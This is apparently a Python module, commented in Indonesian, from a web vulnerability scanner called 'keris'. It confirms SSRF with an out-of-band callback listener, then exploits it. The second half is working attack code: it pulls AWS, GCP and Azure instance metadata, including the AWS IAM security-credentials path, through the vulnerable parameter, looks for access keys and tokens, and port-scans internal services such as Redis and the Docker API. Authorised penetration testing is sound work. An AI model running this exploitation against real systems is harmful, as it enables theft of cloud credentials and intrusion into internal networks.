"""Deteksi SSRF (Server-Side Request Forgery) via callback listener.

Strategi: jalankan listener lokal di port ephemeral, lalu suntikkan URL
mengarah ke listener ke tiap parameter endpoint yang ditemukan. Bila server
target melakukan request ke listener, berarti SSRF terkonfirmasi (CRITICAL).

OOB (out-of-band) ini bekerja bahkan saat respons disanitasi oleh aplikasi.
"""

import json
import socket
import threading
from http.server import BaseHTTPRequestHandler, HTTPServer
from typing import Dict, List, Optional
from urllib.parse import urlparse, urlencode, parse_qsl, urlunparse, urljoin

from ..core.logger import debug, error, info, ok, warn

try:
    from keris.modules.discovery import discover_endpoints
    HAS_DISCOVERY = True
except Exception:
    HAS_DISCOVERY = False

# URL yang aman digunakan untuk probing: dokumentasi/tool terkendali.
# Dalam mode lokal, callback listener-lah yang jadi bukti.
CALLBACK_HINTS = ("cb", "probe", "ssrf", "fetch", "callback")


def _find_local_ip() -> str:
    """IP lokal yang bisa diakses server target (untuk callback)."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "127.0.0.1"


def _callback_host(base: str) -> str:
    """Pilih host callback yang bisa dijangkau server target.

    Target loopback/lokal -> pakai 127.0.0.1 (andalan untuk lab).
    Target remote -> pakai IP LAN publik mesin ini.
    """
    host = urlparse(base).hostname or ""
    if host in ("127.0.0.1", "localhost", "0.0.0.0") or host.startswith("10.") \
            or host.startswith("192.168.") or host.startswith("172."):
        return "127.0.0.1"
    return _find_local_ip()


class _CallbackHandler(BaseHTTPRequestHandler):
    hits = []
    lock = threading.Lock()

    def log_message(self, *args):
        pass

    def do_GET(self):
        with self.lock:
            self.hits.append(self.path)
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.end_headers()
        self.wfile.write(b"keris-ssrf-callback")

    do_POST = do_GET


class _Listener:
    """Listener HTTP lokal; mencatat request yang masuk."""

    def __init__(self, host: str = "0.0.0.0", port: int = 0):
        self.server = HTTPServer((host, port), _CallbackHandler)
        self.port = self.server.server_address[1]
        _CallbackHandler.hits = []
        self.thread = threading.Thread(target=self.server.serve_forever, daemon=True)

    def start(self):
        self.thread.start()

    def stop(self):
        self.server.shutdown()
        self.server.server_close()

    @property
    def hits(self) -> List[str]:
        return list(_CallbackHandler.hits)

    @property
    def hit(self) -> bool:
        return bool(_CallbackHandler.hits)


def _param_names(full_url: str) -> List[str]:
    parts = urlparse(full_url)
    return [k for k, _ in parse_qsl(parts.query)]


def _inject(full_url: str, param: str, value: str) -> str:
    parts = urlparse(full_url)
    q = dict(parse_qsl(parts.query))
    q[param] = value
    return urlunparse(parts._replace(query=urlencode(q)))


def probe_ssrf(base: str,
               client,
               extra_urls: Optional[List[str]] = None,
               timeout: float = 6.0) -> List[Dict]:
    """Fuzz parameter dengan URL callback; konfirmasi SSRF bila callback hit.

    Returns list finding dict: {severity, title, endpoint, evidence}.
    """
    findings: List[Dict] = []
    endpoints = list(extra_urls or [])

    if HAS_DISCOVERY:
        try:
            disc = discover_endpoints(base, client, max_assets=30)
            endpoints.extend(disc.get("api_endpoints", []))
            endpoints.extend(disc.get("urls", []))
        except Exception as e:
            debug(f"discovery gagal: {e}")
    if not endpoints:
        endpoints = [base]

    # endpoint bisa berupa path relatif -> gabung dengan base
    endpoints = [urljoin(base.rstrip("/") + "/", u) if u.startswith("/") else u
                 for u in dict.fromkeys(endpoints)]

    # hanya endpoint yang punya parameter
    with_params = [u for u in endpoints if _param_names(u)]
    if not with_params:
        info("Tidak ada parameter untuk uji SSRF")
        return findings

    cb_host = _callback_host(base)
    listener = _Listener()
    listener.start()
    cb_url = f"http://{cb_host}:{listener.port}/cb"

    info(f"Callback listener aktif di {cb_url} ({len(with_params)} endpoint)")

    for full in with_params:
        params = _param_names(full)
        for p in params:
            payload_url = _inject(full, p, cb_url)
            try:
                r = client.get(payload_url, timeout=timeout)
                _ = r.status_code
            except Exception:
                continue
            if listener.hit:
                listener.stop()
                return [{
                    "severity": "CRITICAL",
                    "title": "SSRF terkonfirmasi (callback out-of-band)",
                    "endpoint": payload_url,
                    "vuln_url": payload_url,
                    "vuln_param": p,
                    "evidence": (
                        f"Server melakukan request balik ke callback "
                        f"({listener.hits[0]}). Parameter `{p}` dapat digunakan "
                        f"untuk menarik resource internal/cloud metadata."
                    ),
                }]

    listener.stop()
    if listener.hit:
        findings.append({
            "severity": "CRITICAL",
            "title": "SSRF terkonfirmasi (callback out-of-band)",
            "endpoint": base,
            "evidence": (
                f"Server melakukan request balik ke callback "
                f"({listener.hits[0]}). Parameter dapat digunakan untuk "
                f"menarik resource internal/cloud metadata."
            ),
        })
        ok(f"SSRF terkonfirmasi via callback: {base}")
    else:
        debug("Tidak ada callback; SSRF tidak terkonfirmasi")

    return findings


# --- exploitation SSRF: cloud metadata + port internal ---

AWS_META = "http://169.254.169.254/latest/meta-data/"
GCP_META = "http://metadata.google.internal/computeMetadata/v1/"
AZURE_META = ("http://169.254.169.254/metadata/instance?"
              "api-version=2021-02-01")

INTERNAL_PORTS = [
    (80, "http"), (443, "https"), (3306, "MySQL"), (5432, "PostgreSQL"),
    (6379, "Redis"), (27017, "MongoDB"), (9200, "Elasticsearch"),
    (8080, "http-alt"), (8000, "http"), (5000, "Flask/API"), (22, "SSH"),
    (2375, "Docker API"), (2376, "Docker TLS"), (7001, "WebLogic"),
    (9443, "Kubernetes"),
]

METADATA_MARKERS = [
    "accesskeyid", "secretaccesskey", "token", "iam", "role", "instance-id",
    "ami-id", "projectid", "authorization",
]


def _fetch_through(base: str, client, vuln_url: str, vuln_param: str,
                   target: str, timeout: float = 8.0):
    """Fetch URL internal melalui parameter SSRF yang rentan."""
    payload = _inject(vuln_url, vuln_param, target)
    try:
        r = client.get(payload, timeout=timeout)
        return r.status_code, r.text
    except Exception:
        return None, ""


def exploit_metadata(base: str, client, vuln_url: str, vuln_param: str) -> List[Dict]:
    """Coba ambil metadata cloud (AWS/GCP/Azure) lewat SSRF."""
    findings = []
    targets = [
        ("AWS IAM", AWS_META + "iam/security-credentials/"),
        ("AWS metadata", AWS_META),
        ("GCP metadata", GCP_META),
        ("Azure metadata", AZURE_META),
    ]
    for name, url in targets:
        code, body = _fetch_through(base, client, vuln_url, vuln_param, url)
        if code is None:
            continue
        body_l = body.lower()
        if code == 200 and any(m in body_l for m in METADATA_MARKERS):
            findings.append({
                "severity": "CRITICAL",
                "title": f"Cloud metadata terekspos via SSRF ({name})",
                "endpoint": vuln_url,
                "evidence": f"Berhasil menarik {url} -> {body[:300]}",
            })
            ok(f"Cloud metadata {name} terekspos via SSRF!")
            break
    return findings


def scan_internal_ports(base: str, client, vuln_url: str, vuln_param: str,
                        timeout: float = 6.0) -> List[Dict]:
    """Scan port internal umum via SSRF (localhost)."""
    findings = []
    open_ports = []
    for port, service in INTERNAL_PORTS:
        url = f"http://127.0.0.1:{port}/"
        code, body = _fetch_through(base, client, vuln_url, vuln_param, url, timeout)
        if code is None:
            continue
        # 502/503/504 = gateway error -> port tertutup (SSRF fetch gagal konek)
        if code in (502, 503, 504):
            continue
        # hanya status yang jelas "ada service" dianggap terbuka. Respons 200
        # pun bisa berupa halaman error app (false positive), jadi verifikasi
        # bahwa body bukan halaman 404/error umum aplikasi.
        if code in (200, 301, 302, 401, 403):
            low = body.lower()[:500]
            if any(m in low for m in ("404 not found", "cannot connect", "connection refused",
                                      "no route to host", "failed to connect")):
                continue
            open_ports.append((port, service, code, body[:120]))
    if open_ports:
        findings.append({
            "severity": "HIGH",
            "title": "Port internal terekspos via SSRF (localhost)",
            "endpoint": vuln_url,
            "evidence": "; ".join(
                f"{p} {s} (status {c})" for p, s, c, _ in open_ports[:10]),
        })
        ok(f"SSRF: {len(open_ports)} port internal terbuka di localhost")
    else:
        debug("SSRF: tidak ada port internal terbuka")
    return findings


def exploit_ssrf(base: str, client, vuln_url: str, vuln_param: str) -> List[Dict]:
    """Eksploitasi SSRF: cloud metadata + port scan internal."""
    findings = []
    info("=== SSRF EXPLOIT ===")
    findings.extend(exploit_metadata(base, client, vuln_url, vuln_param))
    findings.extend(scan_internal_ports(base, client, vuln_url, vuln_param))
    return findings
